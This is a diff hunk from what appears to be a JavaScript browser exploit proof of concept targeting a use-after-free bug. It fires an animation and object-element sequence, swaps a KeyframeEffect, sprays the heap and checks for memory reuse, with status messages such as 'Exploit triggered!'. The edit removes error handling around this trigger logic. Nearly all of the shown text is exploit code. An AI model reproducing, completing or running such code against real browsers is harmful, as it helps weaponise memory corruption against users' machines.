@@ -57,29 +57,23 @@
           object.data = "x";
           cite.style.animationIterationCount = "infinite";
           setTimeout(() => {
-            try {
-              const animation = cite.getAnimations()[0];
-              object.width = "1em";
-              object.codeBase;
-              animation.effect = new KeyframeEffect(dl, {});
-              const spray = heapSpray();
-              debug_log("Heap spray completed");
-              // Check for UAF after heap spray
-              debug_log("Checking for UAF memory reuse...");
-              for (let i = 0; i < spray.length; i++) {
-                const arr = spray[i];
-                if (arr[0] !== 0x41) {
-                  debug_log(`UAF detected at spray index: ${i}`);
-                  status.textContent = "UAF detected!";
-                  return;
-                }
+            const animation = cite.getAnimations()[0];
+            object.width = "1em";
+            object.codeBase;
+            animation.effect = new KeyframeEffect(dl, {});
+            const spray = heapSpray();
+            // Check for UAF after heap spray
+            debug_log("Checking for UAF memory reuse...");
+            for (let i = 0; i < spray.length; i++) {
+              const arr = spray[i];
+              if (arr[0] !== 0x41) {
+                debug_log(`UAF detected at spray index: ${i}`);
+                status.textContent = "UAF detected!";
+                return;
               }
-              debug_log("UAF triggered, check for crash or memory corruption.");
-              status.textContent = "Exploit triggered!";
-            } catch (e) {
-              debug_log("Error occurred: " + e.message);
-              status.textContent = "Error: Exploit failed.";
             }
+            debug_log("UAF triggered, check for crash or memory corruption.");
+            status.textContent = "Exploit triggered!";
           }, DELAY);
         }
 
